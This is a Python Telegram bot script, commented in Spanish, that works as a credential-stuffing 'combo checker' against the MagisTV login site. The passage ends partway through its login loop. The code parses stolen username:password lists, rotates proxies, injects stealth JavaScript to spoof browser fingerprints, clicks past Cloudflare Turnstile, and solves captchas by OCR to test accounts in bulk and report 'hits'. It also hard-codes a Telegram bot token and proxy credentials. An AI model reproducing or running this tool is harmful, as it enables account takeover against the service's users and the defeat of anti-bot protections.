#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║   🎬 Flujo TV — Telegram Bot (VPS + Xvfb)                 ║
║   FIX: UA consistente + Diagnóstico real + Stealth completo  ║
╚══════════════════════════════════════════════════════════════╝
"""

import subprocess, sys, os, time, base64, re, traceback, random, json, multiprocessing, threading
import urllib.request, urllib.parse, urllib.error
from datetime import datetime

PROXY = {
    "host": "proxy.flameproxies.com",
    "port": 8989,
    "user": "flm271a2045-package-standard",
    "pass": "3eb53887",
}
ROTATE_EVERY = 10
TG_TOKEN = "8594813440:AAFFKfWwup01Si1C-exXIN2InTABuKgRv7g"
ADMIN_IDS = []

BOT_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data")
os.makedirs(BOT_DATA_DIR, exist_ok=True)
STOP_FILE = "/tmp/flujo_bot_stop"
SCREENSHOT_DIR = os.path.join(BOT_DATA_DIR, "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

if not os.environ.get("DISPLAY"):
    os.environ["DISPLAY"] = ":99"

bot_state = {
    "running": False, "current_chat": None, "_start_time": None,
    "_process": None, "debug_sent": 0, "force_no_proxy": False,
}

def get_proxy_conf():
    return {
        "server": f"http://{PROXY['host']}:{PROXY['port']}",
        "username": PROXY["user"],
        "password": PROXY["pass"],
    }

# ════════════════════════════════════════════════════════════════════════
#  TELEGRAM API
# ════════════════════════════════════════════════════════════════════════

def tg_api(method, params=None, files=None, timeout=30):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
    req = None
    try:
        if files:
            boundary = f"----Bound{random.randint(1000000000,9999999999)}"
            body = b""
            for k, v in (params or {}).items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
            for k, (fname, fdata) in files.items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
                body += fdata if isinstance(fdata, bytes) else fdata.encode()
                body += b"\r\n"
            body += f"--{boundary}--\r\n".encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        elif params:
            data = urllib.parse.urlencode(params).encode()
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = e.read().decode("utf-8", errors="ignore")
        except: body = ""
        return {"ok": False, "error_code": e.code, "description": str(e), "body": body}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def tg_send_msg(chat_id, text, parse_mode="HTML", reply_markup=None, disable_notification=False):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
    if reply_markup: params["reply_markup"] = json.dumps(reply_markup)
    if disable_notification: params["disable_notification"] = True
    return tg_api("sendMessage", params)

def tg_edit_msg(chat_id, msg_id, text, parse_mode="HTML", reply_markup=None):
    params = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode}
    if reply_markup: params["reply_markup"] = json.dumps(reply_markup)
    return tg_api("editMessageText", params)

def tg_send_doc(chat_id, filename, content, caption=None):
    files = {"document": (filename, content if isinstance(content, bytes) else content.encode("utf-8"))}
    params = {"chat_id": chat_id}
    if caption: params["caption"] = caption
    return tg_api("sendDocument", params, files=files, timeout=120)

def tg_send_photo(chat_id, photo_bytes, caption=None):
    files = {"photo": ("screenshot.png", photo_bytes)}
    params = {"chat_id": chat_id}
    if caption: params["caption"] = caption
    return tg_api("sendPhoto", params, files=files, timeout=60)

def tg_answer_cb(query_id, text=None, show_alert=False):
    params = {"callback_query_id": query_id}
    if text: params["text"] = text; params["show_alert"] = show_alert
    return tg_api("answerCallbackQuery", params)

def tg_download_file(file_id):
    r = tg_api("getFile", {"file_id": file_id})
    if not r.get("ok") or not r.get("result", {}).get("file_path"): return None
    file_path = r["result"]["file_path"]
    dl_url = f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}"
    try:
        with urllib.request.urlopen(dl_url, timeout=60) as resp: return resp.read()
    except: return None

def escape_html(t):
    return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

# ════════════════════════════════════════════════════════════════════════
#  TECLADOS
# ════════════════════════════════════════════════════════════════════════

def kb_main():
    return {"inline_keyboard": [
        [{"text": "🚀 Enviar Combo (Proxy)", "callback_data": "send_combo"}, {"text": "🌐 Sin Proxy", "callback_data": "send_local"}],
        [{"text": "🔬 Testear CF", "callback_data": "test_cf"}, {"text": "⏹ Detener", "callback_data": "stop"}],
    ]}

def kb_cancel():
    return {"inline_keyboard": [[{"text": "⏹ Cancelar", "callback_data": "cancel_check"}]]}

# ════════════════════════════════════════════════════════════════════════
#  DEPENDENCIAS
# ════════════════════════════════════════════════════════════════════════

def run_cmd(cmd, timeout=300):
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        out = [l.rstrip() for l in proc.stdout if l.rstrip()]
        proc.wait(timeout=timeout)
        return proc.returncode == 0, "\n".join(out)
    except subprocess.TimeoutExpired: proc.kill(); return False, "Timeout"
    except Exception as e: return False, str(e)

def pip_install(pkg):
    for cmd in [[sys.executable,"-m","pip","install","-q",pkg],
                [sys.executable,"-m","pip","install","-q","--user",pkg],
                [sys.executable,"-m","pip","install","-q","--break-system-packages",pkg]]:
        ok, _ = run_cmd(cmd)
        if ok: return True
    return False

def ensure_mod(imp, pip=None):
    pip = pip or imp
    try: __import__(imp); return True
    except ImportError: pass
    if pip_install(pip):
        try: __import__(imp); return True
        except: pass
    return False

def setup_deps():
    pw = ensure_mod("playwright")
    ocr = ensure_mod("ddddocr")
    if not pw: return False, False
    ok, out = run_cmd([sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"], timeout=300)
    if not ok: print(f"  [!] Chromium: {out[:200]}")
    return True, ocr

# ════════════════════════════════════════════════════════════════════════
#  PARSEAR COMBO
# ════════════════════════════════════════════════════════════════════════

def parse_combo(text):
    accounts = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        fp = re.split(r"[:;|,\s]+", line, maxsplit=1)[0]
        if "/" in fp or fp.startswith("http") or len(fp) > 40: continue
        parts = re.split(r"[:;|,\s]+", line, maxsplit=1)
        if len(parts) == 2 and parts[0] and parts[1]:
            u, p = parts[0].strip(), parts[1].strip()
            if len(u) <= 35 and len(p) <= 60: accounts.append((u, p))
    return accounts

# ════════════════════════════════════════════════════════════════════════
#  OCR
# ════════════════════════════════════════════════════════════════════════

def init_ocr():
    if not ensure_mod("ddddocr"): return None
    try:
        import ddddocr
        try: return ddddocr.DdddOcr(show_ad=False)
        except TypeError: return ddddocr.DdddOcr()
    except: return None

def ocr_solve(eng, b64):
    if "," in b64: b64 = b64.split(",", 1)[1]
    img = base64.b64decode(b64)
    return re.sub(r"[^a-zA-Z0-9]", "", eng.classification(img))

def get_captcha_img(page):
    try:
        for im in page.locator('img[src^="data:image/png;base64,"]').all():
            src = im.get_attribute("src") or ""
            if len(src) > 500: return src
    except: pass
    return None

# ════════════════════════════════════════════════════════════════════════
#  STEALTH JS COMPLETO — Fingerprint consistente ANDROID
# ════════════════════════════════════════════════════════════════════════

STEALTH_JS = """
// === NUCLEO: Ocultar automatización ===
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
delete navigator.__proto__.webdriver;

// === CONSISTENCIA ANDROID MOBILE ===
Object.defineProperty(navigator, 'platform', {get: () => 'Linux armv81'});
Object.defineProperty(navigator, 'userAgentData', {get: () => undefined});
Object.defineProperty(navigator, 'vendor', {get: () => 'Google Inc.'});
Object.defineProperty(navigator, 'appVersion', {get: () => '5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'});
Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 5});
Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
Object.defineProperty(navigator, 'deviceMemory', {get: () => 4});

// === Languages ===
Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en-US', 'en']});
Object.defineProperty(navigator, 'language', {get: () => 'es-ES'});

// === Chrome Runtime (mobile) ===
window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}, app: {}};

// === Plugins (Android Chrome tiene 5 plugins) ===
Object.defineProperty(navigator, 'plugins', {
    get: () => {
        const plugins = [
            {name:'Chrome PDF Plugin', filename:'internal-pdf-viewer', description:'Portable Document Format', length:1},
            {name:'Chrome PDF Viewer', filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai', description:'', length:1},
            {name:'Native Client', filename:'internal-nacl-plugin', description:'', length:2},
        ];
        plugins.refresh = function(){};
        return plugins;
    }
});

// === MIME Types ===
Object.defineProperty(navigator, 'mimeTypes', {
    get: () => {
        const mimes = [
            {type:'application/pdf', suffixes:'pdf', description:'Portable Document Format'},
            {type:'application/x-nacl', suffixes:'', description:'Native Client Executable'},
            {type:'application/x-pnacl', suffixes:'', description:'Portable Native Client Executable'},
        ];
        mimes.refresh = function(){};
        return mimes;
    }
});

// === Permissions ===
const originalQuery = window.navigator.permissions.query;
window.navigator.permissions.query = (parameters) =>
    parameters.name === 'notifications'
        ? Promise.resolve({state: Notification.permission})
        : originalQuery(parameters);

// === WebGL (Adreno 640 — GPU real de Android) ===
const getParam = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function(parameter) {
    if (parameter === 37445) return 'Qualcomm';
    if (parameter === 37446) return 'Adreno (TM) 640';
    if (parameter === 7936) return ['WebGL 1.0 (OpenGL ES 2.0 Chromium)'];
    if (parameter === 7937) return ['WebGL GLSL ES 1.0 (OpenGL ES GLSL ES 1.0 Chromium)'];
    if (parameter === 7938) return 'WebKit';
    if (parameter === 35724) return 'WebGL 1.0 (OpenGL ES 2.0 Chromium)';
    return getParam.call(this, parameter);
};
const getParam2 = WebGL2RenderingContext.prototype.getParameter;
WebGL2RenderingContext.prototype.getParameter = function(parameter) {
    if (parameter === 37445) return 'Qualcomm';
    if (parameter === 37446) return 'Adreno (TM) 640';
    return getParam2.call(this, parameter);
};

// === Canvas fingerprint noise ===
const origGetContext = HTMLCanvasElement.prototype.getContext;
HTMLCanvasElement.prototype.getContext = function(type, attributes) {
    const ctx = origGetContext.call(this, type, attributes);
    if (type === '2d' && ctx) {
        const origGetImageData = ctx.getImageData.bind(ctx);
        ctx.getImageData = function(sx, sy, sw, sh) {
            const imageData = origGetImageData(sx, sy, sw, sh);
            for (let i = 0; i < imageData.data.length; i += 4) {
                imageData.data[i] ^= (Math.random() * 2) | 0;
            }
            return imageData;
        };
    }
    return ctx;
};

// === Connection (4G mobile) ===
Object.defineProperty(navigator, 'connection', {
    get: () => ({
        effectiveType: '4g', rtt: 50, downlink: 10, saveData: false,
        type: 'cellular', ontypechange: null, onchange: null, addEventListener: function(){},
        removeEventListener: function(){}, dispatchEvent: function(){ return true; }
    })
});

// === Screen (Samsung Galaxy S10) ===
Object.defineProperty(screen, 'width', {get: () => 412});
Object.defineProperty(screen, 'height', {get: () => 915});
Object.defineProperty(screen, 'availWidth', {get: () => 412});
Object.defineProperty(screen, 'availHeight', {get: () => 872});
Object.defineProperty(screen, 'colorDepth', {get: () => 24});
Object.defineProperty(screen, 'pixelDepth', {get: () => 24});
Object.defineProperty(window, 'devicePixelRatio', {get: () => 2.625});
Object.defineProperty(window, 'innerWidth', {get: () => 412});
Object.defineProperty(window, 'innerHeight', {get: () => 872});
Object.defineProperty(window, 'outerWidth', {get: () => 412});
Object.defineProperty(window, 'outerHeight', {get: () => 872});

// === Mouse tracking para human_click ===
window._mx = 200; window._my = 400;
document.addEventListener('mousemove', e => { window._mx = e.clientX; window._my = e.clientY; });
document.addEventListener('touchmove', e => {
    if(e.touches[0]){ window._mx = e.touches[0].clientX; window._my = e.touches[0].clientY; }
});

// === Iframe fix ===
try {
    const ed = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
    Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
        get: function() { try { return ed.get.call(this); } catch(e) { return null; } }
    });
} catch(e) {}

// === Notification permission ===
Object.defineProperty(Notification, 'permission', {get: () => 'default'});
"""

# ════════════════════════════════════════════════════════════════════════
#  MOUSE HUMANO (TOUCH PARA MOBILE)
# ════════════════════════════════════════════════════════════════════════

def human_tap(page, x, y):
    """Simula toque de dedo en móvil"""
    steps = random.randint(8, 15)
    try: cur = page.evaluate("()=>({x:window._mx||200,y:window._my||400})")
    except: cur = {"x": 200, "y": 400}
    cx, cy = cur["x"], cur["y"]
    for i in range(steps):
        p = i / steps
        nx = cx + (x - cx) * p + random.gauss(0, 1.5)
        ny = cy + (y - cy) * p + random.gauss(0, 1.5)
        page.touch.move(nx, ny)
        time.sleep(random.uniform(0.005, 0.02))
    page.touch.move(x + random.uniform(-0.5, 0.5), y + random.uniform(-0.5, 0.5))
    time.sleep(random.uniform(0.05, 0.15))
    page.tap(x + random.uniform(-1, 1), y + random.uniform(-1, 1))
    time.sleep(random.uniform(0.3, 0.8))

def _has_login(page):
    """Verifica que el FORMULARIO DE LOGIN real esté visible, no el de CF"""
    try:
        # Buscar inputs que NO estén dentro de iframes de CF
        inputs = page.locator("input[type='text']").all()
        for inp in inputs:
            try:
                if inp.is_visible(timeout=200):
                    # Verificar que no esté en un iframe de cloudflare
                    box = inp.bounding_box()
                    if box and box["y"] > 200:  # El login real está más abajo
                        placeholder = inp.get_attribute("placeholder") or ""
                        if "user" in placeholder.lower() or "usuario" in placeholder.lower() or not placeholder:
                            return True
            except: continue
        # Fallback: si hay input de password visible, el login cargó
        pw = page.locator("input[type='password']").first
        if pw.is_visible(timeout=300):
            return True
    except: pass
    return False

def solve_turnstile(page, max_a=10):
    for att in range(1, max_a+1):
        try:
            for ifr in page.locator("iframe").all():
                src = ifr.get_attribute("src") or ""
                tit = ifr.get_attribute("title") or ""
                if "challenges.cloudflare.com" in src or "turnstile" in tit.lower():
                    box = ifr.bounding_box()
                    if box and box["width"] > 0:
                        # Simular movimiento de dedo antes del tap
                        page.touch.move(box["x"]+random.randint(30,120), box["y"]+random.randint(-40,40))
                        time.sleep(random.uniform(0.3, 0.8))
                        human_tap(page, box["x"]+28, box["y"]+box["height"]/2)
                        page.wait_for_timeout(5000)
                        if _has_login(page): return True
        except: pass
        try:
            for frame in page.frames:
                if "challenges.cloudflare.com" in (frame.url or ""):
                    for sel in [".mark", "label", ".cb-lb", "input[type='checkbox']", "body"]:
                        try:
                            el = frame.locator(sel).first
                            if el.is_visible(timeout=500):
                                box = el.bounding_box()
                                if box:
                                    human_tap(page, box["x"]+box["width"]/2, box["y"]+box["height"]/2)
                                    page.wait_for_timeout(5000)
                                    if _has_login(page): return True
                        except: pass
        except: pass
        page.wait_for_timeout(2000)
    return False

def handle_cf(page, chat_id=None):
    page.wait_for_timeout(4000)
    if _has_login(page): return True

    # Esperar a que aparezca el iframe de Turnstile
    has_ts = False
    for _ in range(25):
        try:
            for f in page.locator("iframe").all():
                s = f.get_attribute("src") or ""; t = f.get_attribute("title") or ""
                if "challenges.cloudflare.com" in s or "turnstile" in t.lower():
                    has_ts = True; break
            if has_ts: break
        except: pass
        page.wait_for_timeout(1000)
        if _has_login(page): return True

    if has_ts:
        print("  [🛡️] Turnstile detectado — resolviendo...")
        if solve_turnstile(page): return True

    # Última espera
    for _ in range(15):
        page.wait_for_timeout(1000)
        if _has_login(page): return True
    return False

# ════════════════════════════════════════════════════════════════════════
#  HELPERS
# ════════════════════════════════════════════════════════════════════════

def clear_auth(ctx):
    try:
        cookies = ctx.cookies()
        ctx.clear_cookies()
        ctx.add_cookies([c for c in cookies if c.get("name") != "msgistv-token"])
    except: pass

def get_page_errors(page):
    sels = ['.ant-message-error','.ant-message-notice-content','.ant-form-item-explain-error',
            '.ant-alert-error','.ant-alert-message','[role="alert"]','[class*="error-text"]']
    msgs = []
    for sel in sels:
        try:
            for el in page.locator(sel).all():
                if el.is_visible(timeout=200):
                    t = (el.text_content() or "").strip()
                    if t and 1 < len(t) < 300 and t not in msgs: msgs.append(t)
        except: continue
    return msgs

def translate_err(code, msg):
    m = (msg or "").lower()
    if not m:
        if code == 500: return "Error server"
        if code == 401: return "Credenciales inválidas"
        return f"Error {code}"
    if "restrin" in m: return "🚫 IP restringida"
    if any(k in m for k in ["incorrect","password","wrong","bad cred","login fail"]): return "❌ Credenciales incorrectas"
    if any(k in m for k in ["not found","no existe"]): return "❌ No existe"
    if any(k in m for k in ["locked","bloquead","disabled","banned"]): return "🔒 Bloqueada"
    if any(k in m for k in ["captcha","código","codigo"]): return "🔄 Captcha error"
    return f"⚠️ {msg[:50]}"

def is_ip_restricted(msg):
    m = (msg or "").lower()
    return "restrin" in m or "restricted" in m

def check_ip_fast(context):
    try:
        ip_page = context.new_page()
        ip_page.goto("https://api.ipify.org?format=text", timeout=12000, wait_until="domcontentloaded")
        ip = (ip_page.inner_text("body") or "").strip()
        ip_page.close()
        return ip if ip and re.match(r'^[\d.:a-fA-F]+$', ip) else "?"
    except:
        try: ip_page.close()
        except: pass
        return "?"

def send_debug_screenshot(page, chat_id, label="debug"):
    if bot_state.get("debug_sent", 0) >= 5: return
    try:
        path = os.path.join(SCREENSHOT_DIR, f"{label}_{int(time.time())}.png")
        page.screenshot(path=path, full_page=False)
        with open(path, "rb") as f: img_data = f.read()
        title = page.title() or "?"; url = page.url or "?"
        caption = f"🐛 <b>{label}</b>\n📄 {escape_html(title)}\n🔗 {escape_html(url)}"
        tg_send_photo(chat_id, img_data, caption=caption)
        bot_state["debug_sent"] = bot_state.get("debug_sent", 0) + 1
        os.remove(path)
    except: pass

def update_progress(chat_id, msg_id, account_name, result_str, stats):
    try:
        if not msg_id: return
        elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
        speed = stats["processed"] / elapsed if elapsed > 0 else 0
        remaining = stats["total"] - stats["processed"]
        eta = remaining / speed if speed > 0 else 0
        eta_str = f"{int(eta//60)}m {int(eta%60)}s" if eta > 0 else "—"
        pct = (stats["processed"] / stats["total"] * 100) if stats["total"] > 0 else 0
        bar_len = 15
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        txt = (
            f"🎬 <b>Flujo TV</b>\n"
            f"[{bar}] {pct:.0f}%\n"
            f"📊 {stats['processed']}/{stats['total']} │ 💰<b>{stats['hits']}</b> │ ❌{stats['fails']}\n"
            f"⚡ {speed:.1f}/s │ ⏱ {eta_str}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"<code>{escape_html(account_name)}</code>\n"
            f"  {result_str}\n"
            f"🌐 {stats.get('ip','?')}"
        )
        tg_edit_msg(chat_id, msg_id, txt, reply_markup=kb_cancel())
    except: pass

# ════════════════════════════════════════════════════════════════════════
#  DIAGNÓSTICO CF REAL
# ════════════════════════════════════════════════════════════════════════

def test_cf_diagnostic(chat_id):
    from playwright.sync_api import sync_playwright
    tg_send_msg(chat_id, "🔬 Diagnosticando Cloudflare... (espera ~40s)")
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False, args=["--no-sandbox","--disable-blink-features=AutomationControlled"])
            ctx_kw = {
                "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                "viewport": {"width": 412, "height": 915},
                "is_mobile": True, "has_touch": True,
                "screen": {"width": 412, "height": 915},
                "device_scale_factor": 2.625,
                "proxy": get_proxy_conf(),
                "extra_http_headers": {"Accept-Language": "es-ES,es;q=0.9"},
            }
            context = browser.new_context(**ctx_kw)
            context.add_init_script(STEALTH_JS)
            page = context.new_page()

            error_msg = "Ninguno"
            try:
                page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=30000)
            except Exception as e:
                error_msg = str(e)[:150]

            # Esperar HASTA 35 segundos para que Turnstile se resuelva
            title = "?"; url = "?"; login_ok = False
            for sec in range(35):
                page.wait_for_timeout(1000)
                title = page.title() or "?"
                url = page.url or "?"
                if _has_login(page):
                    login_ok = True
                    break

            path = os.path.join(SCREENSHOT_DIR, "diag.png")
            page.screenshot(path=path)
            with open(path, "rb") as f: img_data = f.read()
            os.remove(path)

            if login_ok:
                result = "🟢 <b>CF RESUELTO CORRECTAMENTE</b>\nEl login está visible. El proxy + stealth funcionan."
            elif "incompatible" in title.lower() or "incompatible" in error_msg.lower():
                result = "🔴 <b>BLOQUEADO: Incompatible</b>\nCF detectó automatización. El fingerprint del navegador no es creíble."
            elif "un momento" in title.lower() or "verificación" in title.lower():
                result = "🟡 <b>CF NO SE RESOLVIÓ</b>\nTurnstile cargó pero no pasó. Puede ser timing o el click no llegó."
            elif "terminated" in error_msg.lower() or "incomplete" in error_msg.lower():
                result = "🔴 <b>PROXY CORTA CONEXIÓN</b>\nEl proxy tira la conexión antes de que CF cargue."
            else:
                result = "🟡 <b>SIN RESULTADO CLARO</b>"

            caption = f"{result}\n\n⏱ Esperó: {min(35, sec+1)}s\n📄 Title: <code>{escape_html(title)}</code>\n🔗 URL: <code>{escape_html(url)}</code>\n❌ Error: <code>{escape_html(error_msg)}</code>"
            tg_send_photo(chat_id, img_data, caption)
            browser.close()
    except Exception as e:
        tg_send_msg(chat_id, f"❌ Error: <code>{escape_html(str(e))}</code>")

# ════════════════════════════════════════════════════════════════════════
#  MOTOR DE CHECK
# ════════════════════════════════════════════════════════════════════════

def run_checker(accounts, chat_id, msg_id, use_proxy):
    from playwright.sync_api import sync_playwright
    hits, hits_lines, errors = [], [], {}
    processed = fails = 0
    start_time = time.time()
    bot_state["debug_sent"] = 0
    stats = {"total": len(accounts), "hits": 0, "fails": 0, "processed": 0, "start_time": start_time, "ip": "VPS" if not use_proxy else "?"}
    ocr_engine = init_ocr()
    use_ocr = ocr_engine is not None

    # ★★★ UA CONSISTENTE CON ANDROID MOBILE ★★★
    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=False,
            args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run","--no-default-browser-check","--disable-extensions"],
        )
        idx = batch_num = 0
        consecutive_cf_fails = 0

        while idx < len(accounts):
            if os.path.exists(STOP_FILE):
                try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido</b>", reply_markup=kb_main())
                except: pass
                try: browser.close()
                except: pass
                return hits, hits_lines

            batch_num += 1
            batch_end = min(idx + ROTATE_EVERY, len(accounts))

            # ★★★ CONTEXTO 100% CONSISTENTE ANDROID ★★★
            ctx_kw = {
                "user_agent": UA,
                "viewport": {"width": 412, "height": 915},
                "is_mobile": True, "has_touch": True,
                "screen": {"width": 412, "height": 915},
                "device_scale_factor": 2.625,
                "extra_http_headers": {
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-CH-UA-Platform": '"Android"',
                    "Sec-CH-UA-Mobile": "?1",
                    "Sec-CH-UA": '"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                },
            }
            if use_proxy: ctx_kw["proxy"] = get_proxy_conf()

            context = page = None
            try:
                context = browser.new_context(**ctx_kw)
                context.add_init_script(STEALTH_JS)
                page = context.new_page()
            except Exception as e:
                fails += (batch_end - idx); processed += (batch_end - idx)
                stats["fails"] = fails; stats["processed"] = processed
                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx: {str(e)[:30]}", stats)
                idx = batch_end; continue

            nav_ok = nav_error = False
            nav_error = ""
            for _ in range(3):
                try:
                    page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000)
                    nav_ok = True; break
                except Exception as e:
                    nav_error = str(e)[:100]; time.sleep(3)

            if not nav_ok:
                fails += (batch_end - idx); processed += (batch_end - idx)
                stats["fails"] = fails; stats["processed"] = processed
                update_progress(chat_id, msg_id, f"Batch {batch_num}", "Nav fail", stats)
                consecutive_cf_fails += 1
                send_debug_screenshot(page, chat_id, f"nav_b{batch_num}")
                if consecutive_cf_fails >= 2: time.sleep(15); consecutive_cf_fails = 0
                idx = batch_end
                try: context.close()
                except: pass
                continue

            cf_ok = handle_cf(page, chat_id)
            if not cf_ok:
                fails += (batch_end - idx); processed += (batch_end - idx)
                stats["fails"] = fails; stats["processed"] = processed
                update_progress(chat_id, msg_id, f"Batch {batch_num}", "CF fail", stats)
                consecutive_cf_fails += 1
                send_debug_screenshot(page, chat_id, f"cf_b{batch_num}")
                if consecutive_cf_fails >= 2: time.sleep(20); consecutive_cf_fails = 0
                idx = batch_end
                try: context.close()
                except: pass
                continue

            consecutive_cf_fails = 0
            if use_proxy:
                ip = check_ip_fast(context); stats["ip"] = ip
                print(f"  [🔄] B{batch_num} IP:{ip}")
            else:
                stats["ip"] = "VPS"

            state = {}
            NON_LOGIN = ["/codigo", "/info", "/dashboard", "/home/img", "/img"]

            def make_on_resp(st):
                def on_resp(resp):
                    url = resp.url
                    try:
                        if "/api/v1/magis/codigo" in url and resp.status == 200:
                            d = resp.json()
                            if d.get("code") == 200: st["cap_uuid"] = d["data"]["uuid"]; st["cap_b64"] = d["data"]["data"]
                    except: pass
                    try:
                        if "/api/v1/magis/info" in url and resp.status == 200:
                            d = resp.json()
                            if d.get("code") == 200 and d.get("data"): st["info"] = d["data"]
                            elif "restrin" in d.get("msg", "").lower(): st["login_code"] = d.get("code", 500); st["login_msg"] = d.get("msg", ""); st["api_hit"] = True
                    except: pass
                    try:
                        if "/api/v1/magis/dashboard" in url and resp.status == 200:
                            d = resp.json()
                            if d.get("code") == 200 and d.get("data"): st["dashboard"] = d["data"]
                    except: pass
                    if "/api/" in url:
                        login_kw = ["/login", "/signin", "/auth", "/authenticate"]
                        is_login = any(l in url.lower() for l in login_kw)
                        after_click = st.get("clicked_at", 0) > 0 and (time.time() - st["clicked_at"]) < 15
                        if (is_login or after_click) and not st.get("api_hit") and not any(n in url for n in NON_LOGIN):
                            try:
                                d = resp.json(); st["api_hit"] = True; st["login_code"] = d.get("code", resp.status); st["login_msg"] = d.get("msg", "")
                                if d.get("code") == 200:
                                    st["login_ok"] = True
                                    tok = d.get("data", {}).get("token") if isinstance(d.get("data"), dict) else None
                                    if tok: st["token"] = tok
                            except: st["api_hit"] = True; st["login_code"] = resp.status
                return on_resp

            page.on("response", make_on_resp(state))
            ip_restricted = False

            for local_i in range(batch_end - idx):
                if os.path.exists(STOP_FILE): break
                user, pwd = accounts[idx]
                processed += 1; stats["processed"] = processed
                state.clear()
                state.update({"cap_uuid":None,"cap_b64":None,"info":None,"dashboard":None,"token":None,"login_ok":False,"login_msg":"","login_code":-1,"api_hit":False,"clicked_at":0})
                clear_auth(context)

                try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
                except:
                    try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
                    except:
                        fails += 1; stats["fails"] += 1; errors["Nav"] = errors.get("Nav",0)+1
                        update_progress(chat_id, msg_id, user, "Nav error", stats); idx += 1; continue

                page.wait_for_timeout(1000)
                if not _has_login(page):
                    if not handle_cf(page):
                        fails += 1; stats["fails"] += 1; errors["CF"] = errors.get("CF",0)+1
                        update_progress(chat_id, msg_id, user, "CF fail", stats); idx += 1; continue

                try:
                    el = page.locator('input[type="text"]').first
                    el.wait_for(state="visible", timeout=3000); el.tap(); time.sleep(0.1); el.fill(user)
                except:
                    fails += 1; stats["fails"] += 1; errors["NoInput"] = errors.get("NoInput",0)+1
                    update_progress(chat_id, msg_id, user, "No input", stats); idx += 1; continue

                time.sleep(0.15)
                try:
                    pw_el = page.locator('input[type="password"]').first
                    pw_el.wait_for(state="visible", timeout=3000); pw_el.tap(); time.sleep(0.1); pw_el.fill(pwd)
                except:
                    fails += 1; stats["fails"] += 1; errors["NoPass"] = errors.get("NoPass",0)+1
                    update_progress(chat_id, msg_id, user, "No pass", stats); idx += 1; continue

                time.sleep(0.15)
                login_success = False
                for ci in range(1, 4):
                    if ci > 1:
                        state["cap_uuid"] = None; state["cap_b64"] = None
                        try:
                            img = page.locator('img[src^="data:image"]').first
                            if img.is_visible(timeout=1000): img.tap(); page.wait_for_timeout(1500)
                        except: pass
                    if not state.get("cap_b64"):
                        pg = get_captcha_img(page)
                        if pg: state["cap_b64"] = pg
                        if not state.get("cap_b64"):
                            for _ in range(8):
                                if state.get("cap_b64"): break
                                page.wait_for_timeout(800)

                    cap_filled = False
                    if use_ocr and state.get("cap_b64"):
                        try:
                            ct = ocr_solve(ocr_engine, state["cap_b64"])
                            if ct:
                                for sel in ['input[placeholder="validateCode"]','input[placeholder*="code" i]']:
                                    try:
                                        el = page.locator(sel).first
                                        if el.is_visible(timeout=500): el.tap(); el.fill(""); el.fill(ct); cap_filled = True; break
                                    except: continue
                                if not cap_filled:
                                    try:
                                        for inp in reversed(page.locator("input").all()):
                                            tp = inp.get_attribute("type") or "text"
                                            if tp in ("text","") and inp.is_visible() and not inp.input_value():
